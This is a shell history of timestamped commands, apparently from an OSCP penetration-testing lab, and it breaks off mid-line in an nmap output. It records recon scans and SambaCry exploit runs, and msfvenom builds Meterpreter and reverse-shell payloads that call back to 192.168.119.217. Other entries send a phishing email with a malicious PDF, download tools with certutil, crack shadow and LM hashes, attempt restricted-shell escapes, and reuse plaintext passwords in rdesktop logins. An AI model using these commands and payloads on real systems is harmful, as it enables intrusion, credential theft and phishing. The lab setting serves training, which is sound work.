 3525  2020-09-29 07:01  cat enum4linux.txt
 3526  2020-09-29 07:08  cd sshuttle-0.78.3/
 3527  2020-09-29 07:16  cast tcp_3389_rdp_nmap.txt
 3528  2020-09-29 07:20  rdesktop -u grace -p RGGhBuwr9MSJiOT  10.2.2.22
 3529  2020-09-29 07:21  rdesktop -u joshua -p QzdXVwvofAsfmZ8  10.2.2.22
 3530  2020-09-29 07:22  rdesktop -u jessica -p 2TtublVmeSAKFo6  10.2.2.22
 3531  2020-09-29 07:40  cat tcp_135_rpc_nmap.txt
 3532  2020-09-29 07:41  smbclient -L //10.2.2.22
 3533  2020-09-29 07:51  rdesktop -u carol -p zaJUcrjG1JHNN8z  10.2.2.22
 3534  2020-09-29 07:53  rdesktop -u john -p easyas123  10.2.2.22
 3535  2020-09-29 08:00  autorecon 10.11.10.7
 3536  2020-09-29 08:02  autorecon 10.11.10.146
 3537  2020-09-29 08:02  cd 7
 3538  2020-09-29 08:02  rmdir 7
 3539  2020-09-29 08:02  cd 10.11.10.7
 3540  2020-09-29 08:03  cd _con
 3541  2020-09-29 08:03  nmap -sC -sV -Pn 10.11.1.7
 3542  2020-09-29 08:05  rm -rf 10.11.10.146 10.11.10.7
 3543  2020-09-29 08:05  autorecon 10.11.1.146
 3544  2020-09-29 08:16  rdesktop -u carol -p smilealot  10.2.2.22
 3545  2020-09-29 08:52  rdesktop -u manager -p smilealot  10.2.2.22
 3546  2020-09-29 08:54  hashid zaJUcrjG1JHNN8z
 3547  2020-09-29 08:58  cat smb
 3548  2020-09-29 09:01  proxychains smbclient  //10.2.2.150/SusieShare -U ""
 3549  2020-09-29 09:08  vim libbindshell-samba.so
 3550  2020-09-29 09:17  locate multiple/remote/41740.txt
 3551  2020-09-29 09:17  vim /usr/share/exploitdb/exploits/multiple/remote/41740.txt
 3552  2020-09-29 09:31  cat ~/.ssh/config
 3553  2020-09-29 09:38  cat tcp_139_smb_nmap.txt
 3554  2020-09-29 09:38  cat libbindshell-samba.so
 3555  2020-09-29 09:38  string libbindshell-samba.so
 3556  2020-09-29 09:38  strings libbindshell-samba.so
 3557  2020-09-29 09:41  smbclient  //10.2.2.150/SusieShare -U ""
 3558  2020-09-29 09:41  smbclient  //10.11.1.150/SusieShare -U ""
 3559  2020-09-29 09:42  vim FsSRC.txt
 3560  2020-09-29 09:43  searchsploit Samba 4.5
 3561  2020-09-29 09:45  lsa
 3562  2020-09-29 09:49  searchsploit cry
 3563  2020-09-29 09:51  locate cve_2017_7494.py 
 3564  2020-09-29 09:53  locate / | grep cve_2017_7494.py 
 3565  2020-09-29 09:56  touch implant.c
 3566  2020-09-29 09:56  vim implant.c
 3567  2020-09-29 09:58  rm implant.c
 3568  2020-09-29 09:58  git clone https://github.com/joxeankoret/CVE-2017-7494.git
 3569  2020-09-29 09:58  cd CVE-2017-7494
 3570  2020-09-29 09:59  rm libimplantx32.so libimplantx64.so 
 3571  2020-09-29 09:59  vim config.h
 3572  2020-09-29 09:59  make
 3573  2020-09-29 10:00  cd ~/OSCP/results/10.11.1.146/exploit
 3574  2020-09-29 10:04  searchsploit Samba 4.5.4
 3575  2020-09-29 10:05  git clone https://github.com/opsxcq/exploit-CVE-2017-7494.git
 3576  2020-09-29 10:05  cd exploit-CVE-2017-7494
 3577  2020-09-29 10:06  pip install -r requirements.txt\n
 3578  2020-09-29 10:09  python exploit.py ./exploit.py -t 10.11.1.146 -e libbindshell-samba.so \\n             -s SusieShare -r /SusieShare/libbindshell-samba.so \\n             -u  -p  -P 445
 3579  2020-09-29 10:09  python exploit.py ./exploit.py -t 10.11.1.146 -e libbindshell-samba.so \\n             -s SusieShare -r /SusieShare/libbindshell-samba.so \\n             -u kali -p  -P 445
 3580  2020-09-29 10:09  python exploit.py ./exploit.py -t 10.11.1.146 -e libbindshell-samba.so \\n             -s SusieShare -r /SusieShare/libbindshell-samba.so \\n             -u kali -p ""  -P 445
 3581  2020-09-29 10:09  ./exploit.py
 3582  2020-09-29 10:10  ./exploit.py -h
 3583  2020-09-29 10:10  python exploit.py ./exploit.py -t 10.11.1.146 -e libbindshell-samba.so \\n             -s SusieShare -r /SusieShare/libbindshell-samba.so \\n             -u kali -p kali  -P 445
 3584  2020-09-29 10:12  ./exploit.py ./exploit.py -t localhost -e libbindshell-samba.so \\n             -s data -r /data/libbindshell-samba.so \\n             -u sambacry -p nosambanocry -P 6699
 3585  2020-09-29 10:12  ./exploit.py -t localhost -e libbindshell-samba.so \\n             -s data -r /data/libbindshell-samba.so \\n             -u sambacry -p nosambanocry -P 6699
 3586  2020-09-29 10:13  ./exploit.py -t 10.11.1.146 -e libbindshell-samba.so \\n             -s SusieShare -r /SusieShare/libbindshell-samba.so \\n             -u lol -p lol -P 135
 3587  2020-09-29 10:14  ./exploit.py -t 10.11.1.146 -e libbindshell-samba.so \\n             -s SusieShare -r /SusieShare/libbindshell-samba.so \\n             -u lol -p lol -P 445
 3588  2020-09-29 10:19  searchsploit SambaCry 
 3589  2020-09-29 10:19  searchsploit SambaCr 
 3590  2020-09-29 10:34  kali at kali in ~/OSCP/results/10.11.1.146/scans (master●) 
 3591  2020-09-29 10:34  $ cat _full_tcp_nmap.txt 
 3592  2020-09-29 10:34  # Nmap 7.80 scan initiated Tue Sep 29 08:05:16 2020 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /home/kali/OSCP/results/10.11.1.146/scans/_full_tcp_nmap.txt -oX /home/kali/OSCP/results/10.11.1.146/scans/xml/_full_tcp_nmap.xml 10.11.1.146
 3593  2020-09-29 10:34  Nmap scan report for 10.11.1.146
 3594  2020-09-29 10:34  Host is up, received user-set (0.23s latency).
 3595  2020-09-29 10:34  Scanned at 2020-09-29 08:05:16 UTC for 320s
 3596  2020-09-29 10:34  Not shown: 65531 filtered ports
 3597  2020-09-29 10:34  Reason: 65531 no-responses
 3598  2020-09-29 10:34  PORT    STATE  SERVICE     REASON       VERSION
 3599  2020-09-29 10:34  22/tcp  open   ssh         syn-ack      OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
 3600  2020-09-29 10:34  139/tcp open   netbios-ssn syn-ack      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 3601  2020-09-29 10:34  443/tcp closed https       conn-refused
 3602  2020-09-29 10:34  445/tcp open   netbios-ssn syn-ack      Samba smbd 4.5.4-Ubuntu (workgroup: WORKGROUP)
 3603  2020-09-29 10:34  Service Info: Host: SUSIE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 3604  2020-09-29 10:34  Host script results:
 3605  2020-09-29 10:34  Read data files from: /usr/bin/../share/nmap
 3606  2020-09-29 10:34  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 3607  2020-09-29 10:34  # Nmap done at Tue Sep 29 08:10:36 2020 -- 1 IP address (1 host up) scanned in 319.62 seconds
 3608  2020-09-29 10:41  smbclient  //10.11.1.146/SusieShare -U ""
 3609  2020-09-29 10:47  git commit -m "finished sussie"
 3610  2020-09-29 18:50  cd 10.11.1.248
 3611  2020-09-29 18:50  cd sc
 3612  2020-09-29 19:06  rdesktop -u james -p FmyN3rZ37LNss2X  10.2.2.22
 3613  2020-09-29 19:17  cd /home/kali/Downloads/x64/
 3614  2020-09-29 19:20  cd results/10.2.2.23
 3615  2020-09-29 19:20  touch adminhash.txt
 3616  2020-09-29 19:20  vim adminhash.txt
 3617  2020-09-29 19:21  /usr/sbin/john --format=LM --rules -w=/usr/share/wordlists/rockyou.txt adminhash.txt
 3618  2020-09-29 19:22  cd 10.11.1.229
 3619  2020-09-29 19:25  /usr/sbin/john --format=mssql --rules -w=/usr/share/wordlists/rockyou.txt sa_pass.txt
 3620  2020-09-29 19:29  cd ~/Downloads/x64
 3621  2020-09-29 19:33  /usr/sbin/john --rules -w=/usr/share/wordlists/rockyou.txt adminhash.txt
 3622  2020-09-29 19:34  msfvenom  -p  windows/x86/meterpreter/reverse_tcp  lhost=192.168.119.217 lport=443  -f hta -o meterpreter.hta
 3623  2020-09-29 19:45  sudo cd /root/.msf4/local/
 3624  2020-09-29 19:46  sudo chown kali.kali stats.pdf
 3625  2020-09-29 19:48  vim stats.pdf
 3626  2020-09-29 20:08  mail
 3627  2020-09-29 20:08  sendmail 
 3628  2020-09-29 20:12  sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
 3629  2020-09-29 20:15  sendEmail -t pedro@thinc.local -f eric@thinc.local -s 10.11.1.7 -u Important Upgrade Instructions -a ~/Downloads/x64/stats.pdf
 3630  2020-09-29 20:16  ksjldf
 3631  2020-09-29 20:16  bla bala, eric
 3632  2020-09-29 20:33  cd dev_dept/results/10.2.2.22
 3633  2020-09-29 20:37  cd privilege-escalation-awesome-scripts-suite
 3634  2020-09-29 20:37  cd x
 3635  2020-09-29 20:38  cd Release/
 3636  2020-09-29 20:40  lcoate / | grep accesschk.exe 
 3637  2020-09-29 20:40  locate / | grep accesschk.exe 
 3638  2020-09-29 21:19  cd 10.2.2.22
 3639  2020-09-29 21:19  c Downloads
 3640  2020-09-29 21:20  cd results/10.2.2.22
 3641  2020-09-29 21:21  cherrytree carol.ctb
 3642  2020-09-29 21:34  rdesktop -u carol -p carol1978AB  10.2.2.22
 3643  2020-09-29 21:51  git commit -m "finished the dev dpet carl"
 3644  2020-09-29 21:51  git commit -m "finished the dev dpet carol"
 3645  2020-09-29 22:08  cherrytreer luigi.ctb
 3646  2020-09-29 22:12  cd 10.3.3.31
 3647  2020-09-29 22:20  sshuttle -r  root@10.1.1.1 10.3.3.1/24
 3648  2020-09-29 22:20  cd Downloads/sshuttle-0.78.3
 3649  2020-09-29 22:21  mkdir admin_dept
 3650  2020-09-29 22:22  autorecon 10.3.3.14
 3651  2020-09-29 22:22  cd ~/OSCP/admin_dept
 3652  2020-09-29 22:23  autorecon 10.3.3.34
 3653  2020-09-30 10:42  cd 10.3.3.
 3654  2020-09-30 18:45  ./run -r  j0hn@10.11.1.252:22000  10.2.2.1/24
 3655  2020-09-30 18:45  ./run -r  root@10.1.1.1  10.3.3.1/24
 3656  2020-09-30 18:51  nmap 10.3.3.14
 3657  2020-09-30 18:54  gobuster dir -u http://10.3.3.14/  -w  /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"
 3658  2020-09-30 18:55  ssh j0hn@10.11.1.252 -p 22000
 3659  2020-09-30 18:55  ssh root@10.11.1.252 -p 22000
 3660  2020-09-30 18:56  ssh root@10.1.1.1
 3661  2020-09-30 19:00  ssh -R  8080:127.0.0.1:8080 root@10.1.1.1
 3662  2020-09-30 19:09  cd results/10.3.3.34
 3663  2020-09-30 19:09  gobuster dir -u http://10.3.3.34/  -w  /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"
 3664  2020-09-30 19:16  cat tcp_25_smtp_nmap.txt
 3665  2020-09-30 19:17  smtp-user-enum -M VRFY -u root -t 10.3.3.14
 3666  2020-09-30 19:47  locate php-reverse-shell.php
 3667  2020-09-30 19:48  cp /home/kali/OSCP/dev_dept/10.2.2.150/exploits/php-reverse-shell.php ./
 3668  2020-09-30 19:55  mv shell.exe ../exploit
 3669  2020-09-30 19:57  xs ..
 3670  2020-09-30 20:51  touch pass.txt
 3671  2020-09-30 21:05  lcoate / | grep nmap.exe
 3672  2020-09-30 21:05  locate  / | grep nmap.exe
 3673  2020-09-30 21:06  g
 3674  2020-09-30 21:14  git commit -m "finished kailytn"
 3675  2020-09-30 21:42  cd dev
 3676  2020-09-30 22:03  cd 10.3.3.14
 3677  2020-09-30 22:36  touch gobuster
 3678  2020-09-30 22:36  vim gobuster
 3679  2020-09-30 22:44  sshuttle -r  sean@10.11.1.251 10.1.1.1/24
 3680  2020-09-30 22:49  cat tcp_22_ssh_nmap.txt
 3681  2020-09-30 23:25  cd ~/OSCP/it_dept/results/10.1.1.1/report
 3682  2020-10-01 04:12  cd results/10.3.3.14
 3683  2020-10-01 04:12  cherrytree KAITLYN.ctb
 3684  2020-10-01 04:51  touch nmap.txt\n: 1601527920:0;touch nmap.txt
 3685  2020-10-01 04:53  autorecon 10.3.3.42
 3686  2020-10-01 04:53  autorecon 10.3.3.47
 3687  2020-10-01 04:53  autorecon 10.3.3.190
 3688  2020-10-01 07:31  cd 10.1.1.
 3689  2020-10-01 07:32  rm passwd passwords.txt unshadowpass.txt
 3690  2020-10-01 07:32  touch passwd.txt
 3691  2020-10-01 07:32  vim passwd.txt
 3692  2020-10-01 07:32  touch shadow.txt
 3693  2020-10-01 07:33  unshadow passwd.txt shadow.txt > johnpass
 3694  2020-10-01 07:34  /usr/sbin/john --show johnpass
 3695  2020-10-01 07:35  sudo unshadow passwd.txt shadow.txt > johnpass
 3696  2020-10-01 07:35  vim johnpass
 3697  2020-10-01 07:35  /usr/sbin/john --rules -w=/usr/share/wordlists/rockyou.txt johnpass
 3698  2020-10-01 08:06  passwd
 3699  2020-10-01 08:08  man ls
 3700  2020-10-01 08:09  man zip
 3701  2020-10-01 08:13  which wce32.exe
 3702  2020-10-01 08:13  locate wce32.exe
 3703  2020-10-01 08:14  which [wd
 3704  2020-10-01 08:14  which pwd
 3705  2020-10-01 08:28  find . -mtime -2 -print\n
 3706  2020-10-01 08:32  ls -l ./sshuttle/version.py
 3707  2020-10-01 08:33  date
 3708  2020-10-01 08:35  find / -type f -newerXY '2020-09-29'
 3709  2020-10-01 08:35  find / -type f -newerac '2020-09-29'
 3710  2020-10-01 08:36  find /home/kali -type f -newermt 2020-09-29
 3711  2020-10-01 08:36  ls -l /home/kali/.config/xfce4/xfce4-screenshooter
 3712  2020-10-01 08:37  sudo apt-get install wce
 3713  2020-10-01 08:39  updatedb
 3714  2020-10-01 08:40  locate / | grep wce32.exe
 3715  2020-10-01 08:48  /usr/sbin/john --show johnpass 
 3716  2020-10-01 08:48  ssh james@10.1.1.1
 3717  2020-10-01 09:17  cd 10.3.3.34
 3718  2020-10-01 09:19  wpscan --url http://10.3.3.34/wp-login.php --passwords /usr/share/wordlists/rockyou.txt --usernames admin --max-threads 50
 3719  2020-10-01 10:13  wpscan --url http://10.3.3.34:9999/wp-login.php --passwords /usr/share/wordlists/rockyou.txt --usernames admin --max-threads 50
 3720  2020-10-01 19:20  locate rockyou.txt
 3721  2020-10-01 19:20  cd /usr/share/seclists/Passwords
 3722  2020-10-01 19:20  vim Most-Popular-Letter-Passes.txt
 3723  2020-10-01 19:21  cd Common-Credentials
 3724  2020-10-01 19:21  vim best110.txt
 3725  2020-10-01 19:35  cat top-passwords-shortlist.txt
 3726  2020-10-01 22:19  ssh root@10.3.3.34
 3727  2020-10-01 22:57  git commit -m "finished tricia"
 3728  2020-10-01 23:05  ssh -R  8080:127.0.0.1:8080 root@10.3.3.34
 3729  2020-10-01 23:26  ssh pi@10.11.1.44
 3730  2020-10-01 23:28  curl http://10.11.1.44:8000/
 3731  2020-10-01 23:28  cat tcp_8000_https_gobuster.txt
 3732  2020-10-01 23:29  cat tcp_8000_https_nikto.txt
 3733  2020-10-01 23:29  cat tcp_8000_https_robots.txt
 3734  2020-10-01 23:29  cat tcp_8000_https_whatweb.txt
 3735  2020-10-01 23:31  cat _quick_tcp_nmap.txt
 3736  2020-10-01 23:38  nmap -sCV 10.11.1.44 -oA nmapTop1000
 3737  2020-10-01 23:40  ssh sean@10.11.1.251
 3738  2020-10-01 23:40  ssh -R 8080:127.0.0.1:8080 sean@10.11.1.251
 3739  2020-10-01 23:45  nmap -sCV 10.11.1.44 -oA -p-
 3740  2020-10-01 23:45  nmap -sCV 10.11.1.44 -p-
 3741  2020-10-01 23:52  mkdir 10.1.1.248
 3742  2020-10-01 23:52  cd 10.1.1.248
 3743  2020-10-01 23:53  cp /home/kali/OSCP/13/results/10.11.1.13/exploit/winPEASx64.exe ./
 3744  2020-10-01 23:58  cp /home/kali/OSCP/13/results/10.11.1.13/exploit/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/obj/x64/Release/winPEAS.exe ./
 3745  2020-10-01 23:58  rm winPEASx64.exe
 3746  2020-10-02 00:01  cd results/10.11.1.13/report
 3747  2020-10-02 00:05  locate / | grep juicy
 3748  2020-10-02 00:20  mkdir exploit
 3749  2020-10-02 00:21  cp ~/Downloads/JuicyPotato.exe ./
 3750  2020-10-02 00:51  gcc KE.c
 3751  2020-10-02 00:55  I686-w64-mingw32-gc KE.c
 3752  2020-10-02 00:55  I686-w64-mingw32-gcc KE.c
 3753  2020-10-02 01:03  vim KE.c
 3754  2020-10-02 01:03  i686-w64-mingw32-gcc KE.c
 3755  2020-10-02 01:43  –lws2_32  i686-w64-mingw32-gcc KE.c
 3756  2020-10-02 01:51  cd ~/OSCP/it_dept/results/10.1.1.248/exploit
 3757  2020-10-02 02:05  certutil.exe -urlcache -split -f "http://192.168.119.217/COMahawk64.exe" COMahawk64.exe
 3758  2020-10-02 02:09  rm COMahawk64.exe
 3759  2020-10-02 02:09  cp ~/Downloads/COMahawk64.exe ./
 3760  2020-10-02 02:29  tsdiscon 
 3761  2020-10-02 02:37  rdesktop -u brett -p che  10.1.1.248
 3762  2020-10-02 07:28  change user /install
 3763  2020-10-02 07:43  rdesktop -u che -p che  10.1.1.248
 3764  2020-10-02 07:49  c d..
 3765  2020-10-02 07:50  cd exq
 3766  2020-10-02 07:52  cp /home/kali/OSCP/results/10.11.1.50/exploit/PsExec64.exe ./
 3767  2020-10-02 07:53  certutil.exe -urlcache -split -f "http://192.168.119.217/PsExec64.exe" PsExec64.exe
 3768  2020-10-02 08:38  lnet localgroup administrators [username] /add
 3769  2020-10-02 08:46  rdesktop -u Tomahawk -p :RibSt3ak69 10.1.1.248
 3770  2020-10-02 08:50  rdesktop -u Tomahawk -p RibSt3ak69 10.1.1.248
 3771  2020-10-02 09:17  cd ../../../
 3772  2020-10-02 09:17  cd results/10.1.1.248
 3773  2020-10-02 09:25  rdesktop -u test123 -p lol123  10.1.1.248
 3774  2020-10-02 09:29  sudo nc -nlvp 8080
 3775  2020-10-02 09:30  sudo nc -nlvp 8095
 3776  2020-10-02 09:45  #msfvenom -p windows/# LHOST=192.168.119.217 LPORT=443 -f exe > shell.exe
 3777  2020-10-02 09:46  msfvenom  -p  windows/meterpreter/reverse_tcp  lhost=192.168.119.217 lport=443  -f exe -o meterpreter.exe
 3778  2020-10-02 09:56  sudo apt install msbuild 
 3779  2020-10-02 21:14  rdesktop -u brett -p ilovesecuritytoo  10.1.1.248
 3780  2020-10-02 21:17  sudo ./burpsuite_community_linux_v2020_9_2.sh
 3781  2020-10-02 21:17  sudo burpsuite_community_linux_v2020_9_2.sh
 3782  2020-10-02 21:17  chmod +x burpsuite_community_linux_v2020_9_2.sh
 3783  2020-10-02 21:17  ./burpsuite_community_linux_v2020_9_2.sh
 3784  2020-10-02 21:36  cdls
 3785  2020-10-02 21:36  cd it_dept/results/10.1.1.248
 3786  2020-10-02 22:17  git commit -m "finished brett"
 3787  2020-10-02 22:24  scd
 3788  2020-10-02 22:35  cat tcp_8000_https_index.html
 3789  2020-10-02 22:35  cat tcp_8000_http_nmap.txt
 3790  2020-10-02 22:52  gobuster dir -u https://10.11.1.44:8000/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z -o "/home/kali/OSCP/results/10.11.1.44/scans/tcp_8000_http_gobuster_big.txt"
 3791  2020-10-02 22:58  serachsploit web2py
 3792  2020-10-02 22:58  searchsploit web2py
 3793  2020-10-02 22:58  locate python/webapps/39821.txt
 3794  2020-10-02 22:58  vim /usr/share/exploitdb/exploits/python/webapps/39821.txt
 3795  2020-10-02 23:06  #msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 -f js_le -e generic/none
 3796  2020-10-02 23:07  msfvenom  -p  windows/x64/meterpreter/reverse_tcp  lhost=192.168.119.217 lport=443  -f exe -o meterpreter.exe
 3797  2020-10-02 23:07  msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 -f js_le -e generic/none  
 3798  2020-10-02 23:14  cd ~/Downloads
 3799  2020-10-02 23:14  vi web2py.app.admin.w2p
 3800  2020-10-02 23:15  strings web2py.app.admin.w2p
 3801  2020-10-02 23:19  msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 -f w2p -o rshell.w2p
 3802  2020-10-02 23:39  touch unpackw2p.py
 3803  2020-10-02 23:39  vim unpackw2p.py
 3804  2020-10-02 23:39  python unpackw2p.py web2py.app.lol.w2p
 3805  2020-10-02 23:39  cd /home/kali/Downloads/unpacked/admin
 3806  2020-10-02 23:40  cd lol
 3807  2020-10-02 23:40  vim passwd
 3808  2020-10-02 23:45  rm -rf unpacked
 3809  2020-10-02 23:45  python unpackw2p.py web2py.app.shadow.w2p
 3810  2020-10-02 23:45  cd shadow
 3811  2020-10-02 23:45  cd etc
 3812  2020-10-02 23:46  cat shadow > shadow.txt
 3813  2020-10-02 23:46  vim shadow
 3814  2020-10-02 23:46  vim shadow.txt
 3815  2020-10-02 23:46  cd lol/etc
 3816  2020-10-02 23:46  cat passwd >> passwd.txt
 3817  2020-10-02 23:58  sudo unshadow passwd.txt ../../shadow/etc/shadow.txt > johncrack
 3818  2020-10-02 23:59  cp  johncrack ../../../../OSCP/results/10.11.1.44/exploit
 3819  2020-10-03 00:03  /usr/sbin/john --rules -w=/usr/share/wordlists/rockyou.txt johncrack
 3820  2020-10-03 00:05  ssh emilio@10.11.1.44
 3821  2020-10-03 00:05  cat johncrack
 3822  2020-10-03 00:16  cd osc
 3823  2020-10-03 00:16  git commit -m "finished pi"
 3824  2020-10-03 00:18  ssh mario@10.11.1.44
 3825  2020-10-03 00:29  locate 39632
 3826  2020-10-03 00:29  vim /usr/share/exploitdb/exploits/linux/remote/39632.py
 3827  2020-10-03 00:29  #/usr/share/exploitdb/exploits/linux/remote/39632.py
 3828  2020-10-03 00:29  cp /usr/share/exploitdb/exploits/linux/remote/39632.py ./
 3829  2020-10-03 00:29  pythonl 39632.py
 3830  2020-10-03 00:30  pip install --user paramiko
 3831  2020-10-03 00:31  python3 39632.py
 3832  2020-10-03 00:32  ssh -l mario@10.3.3.42 '/tmp/malicious'\n
 3833  2020-10-03 00:33  ssh -l mario@10.3.3.42 '/tmp/m'\n
 3834  2020-10-03 00:33  ssh -l mario@10.3.3.42 '/tmp/'\n
 3835  2020-10-03 00:33  ssh -l mario@10.3.3.42 
 3836  2020-10-03 00:33  ssh -l mario 10.3.3.42 
 3837  2020-10-03 00:33  ssh -l mario 10.3.3.42 '/tmp'
 3838  2020-10-03 00:34  python 39632.py
 3839  2020-10-03 01:01  ssh  mario 10.3.3.42 - t "/bin/sh"
 3840  2020-10-03 01:02  ssh  mario 10.3.3.42 -t "/bin/sh"
 3841  2020-10-03 01:02  ssh  mario@10.3.3.42 -t "/bin/sh"
 3842  2020-10-03 01:03  ssh mario@10.3.3.42 -t "() { :; }; /bin/bash"
 3843  2020-10-03 01:04  ssh  mario@10.3.3.42 -o ProxyCommand="sh -c /tmp/yourfile.sh"
 3844  2020-10-03 01:09  gobuster dir -u http://10.3.3.42/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z -o "/home/kali/OSCP/results/10.11.1.44/scans/tcp_8000_http_gobuster_big.txt"
 3845  2020-10-03 02:03  ssh mario@10.3.3.42 -t "perl -e 'system("bin/sh"); "
 3846  2020-10-03 02:05  ssh mario@10.3.3.42 -t "perl -e 'exec "/bin/sh";'"
 3847  2020-10-03 02:05  ssh mario@10.3.3.42 -t perl -e 'exec "/bin/sh";'
 3848  2020-10-03 02:09  ssh mario@10.3.3.42 -t perl 
 3849  2020-10-03 02:09  ssh mario@10.3.3.42 -t "bash --noprofile"
 3850  2020-10-03 02:09  vgnsdjkg
 3851  2020-10-03 02:12  scp nmap.txt  mario@10.3.3.42:~
 3852  2020-10-03 02:14  ssh mario@10.3.3.42 -t "perl --noprofile"
 3853  2020-10-03 02:14  ssh mario@10.3.3.42 -t "sh --noprofile"
 3854  2020-10-03 02:15  ssh mario@10.3.3.42 -t "sh --noprofile  --norc"
 3855  2020-10-03 02:15  ssh mario@10.3.3.42 -t "bash --noprofile  --norc"
 3856  2020-10-03 02:15  ssh mario@10.3.3.42 -t "perl -e --noprofile  --norc"
 3857  2020-10-03 02:17  ssh mario@10.3.3.42 -t "--noprofile "
 3858  2020-10-03 02:17  ssh mario@10.3.3.42 -t --noprofile 
 3859  2020-10-03 02:18  ssh mario@10.3.3.42 -t "perl -e --noprofile  "
 3860  2020-10-03 02:18  ssh mario@10.3.3.42 -t " --noprofile"
 3861  2020-10-03 02:20  ssh -t mario "bash --noprofile"\n
 3862  2020-10-03 03:09  gobuster dir -u http://10.3.3.42/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o "/home/kali/OSCP/results/10.11.1.44/scans/tcp_8000_http_gobuster_big.txt"
 3863  2020-10-03 03:18  cd results/10.3.3.42
 3864  2020-10-03 03:18  vim 39632.py
 3865  2020-10-03 03:20  python 39632.py mario mario34 10.3.3.42
 3866  2020-10-03 03:20  python 39632.py mario mario 10.3.3.42
 3867  2020-10-03 03:20  searchsploit lshell
 3868  2020-10-03 03:24  ssh -t mario@10.3.3.42 "bash --noprofile"\n
 3869  2020-10-03 03:26  ?
 3870  2020-10-03 03:26  ssh  mario@10.3.3.42\n
 3871  2020-10-03 03:36  ssh -t mario@10.3.3.42 "python -c 'import pty; pty.spawn("/bin/bash")'"\n
 3872  2020-10-03 04:16  touch lol.c
 3873  2020-10-03 04:17  chmod +x lol.c
 3874  2020-10-03 04:17  gcc lol.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient
 3875  2020-10-03 04:20  cd /usr/include/mysql 
 3876  2020-10-03 04:20  usr/include/mysql 
 3877  2020-10-03 04:20  /usr/include/mysql 
 3878  2020-10-03 04:20  ivm l
 3879  2020-10-03 04:20  vin lol.c
 3880  2020-10-03 04:25  gcc -g -c lol.c -o bomb
 3881  2020-10-03 04:25  gcc -g -c lol.c 
 3882  2020-10-03 04:25  vim lol.o
 3883  2020-10-03 04:30  rm lol.o
 3884  2020-10-03 04:30  cat lol.c > sql.c
 3885  2020-10-03 04:30  vim sql.c
 3886  2020-10-03 04:31  gcc -g -c sql.c
 3887  2020-10-03 04:31  gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so sql.o -lc
 3888  2020-10-03 21:08  ssh -t mario@10.3.3.42 \n
 3889  2020-10-03 21:11  cd 10.3.3.42
 3890  2020-10-03 21:32  git commit -m "finished mario"
 3891  2020-10-03 21:38  sshuttle -f -r  sean@10.11.1.251 10.1.1.1/24\n
 3892  2020-10-03 21:39  sshuttle  -r  sean@10.11.1.251 10.1.1.1/24 &\n
 3893  2020-10-03 21:40  ssh mario@10.3.3.42
 3894  2020-10-03 21:57  curl http://10.3.3.47/
 3895  2020-10-03 21:58  gobuster dir -u http://10.3.3.47/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o "/home/kali/OSCP/results/10.11.1.44/scans/tcp_8000_http_gobuster_big.txt"
 3896  2020-10-03 21:58  cd admin_dept/l
 3897  2020-10-03 21:58  cd admin_dept/
 3898  2020-10-03 22:04  cat 
 3899  2020-10-03 22:05  ftp  -p 10.3.3.47
 3900  2020-10-03 22:05  ftp  10.3.3.47
 3901  2020-10-03 22:09  db_nmap -p 25 -sC -sV -A 10.3.3.27
 3902  2020-10-03 22:09  nmap -p 25 -sC -sV -A 10.3.3.27
 3903  2020-10-03 22:15  nikto -ask=no -h http://10.3.3.47
 3904  2020-10-03 22:54  mkdir 10.3.3.201
 3905  2020-10-03 22:55  touch nmap.txt
 3906  2020-10-03 22:55  vim nmap.txt
 3907  2020-10-03 23:18  serachsploit devils
 3908  2020-10-03 23:18  searchsploit devils
 3909  2020-10-03 23:29  searchsploit CMS
 3910  2020-10-03 23:32  searchsploit clanportal
 3911  2020-10-03 23:34  locate php/webapps/15323.txt
 3912  2020-10-03 23:34  vim /usr/share/exploitdb/exploits/php/webapps/15323.txt
 3913  2020-10-03 23:36  $ cat nmap.txt 
 3914  2020-10-03 23:36  Not shown: 996 filtered ports
 3915  2020-10-03 23:36  PORT    STATE SERVICE VERSION
 3916  2020-10-03 23:36  22/tcp  open  ssh     OpenSSH 5.3 (protocol 2.0)
 3917  2020-10-03 23:36  25/tcp  open  smtp?
 3918  2020-10-03 23:36  80/tcp  open  http    Apache httpd 2.2.15 ((CentOS))
 3919  2020-10-03 23:36  111/tcp open  rpcbind 2-4 (RPC #100000)
 3920  2020-10-03 23:36  Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
 3921  2020-10-03 23:36  Device type: general purpose
 3922  2020-10-03 23:36  Running: Linux 2.6.X|3.X
 3923  2020-10-03 23:36  OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
 3924  2020-10-03 23:36  OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
 3925  2020-10-03 23:36  Uptime guess: 9.604 days (since Mon Sep 21 19:05:38 2020)
 3926  2020-10-03 23:36  Network Distance: 1 hop
 3927  2020-10-03 23:36  TCP Sequence Prediction: Difficulty=257 (Good luck
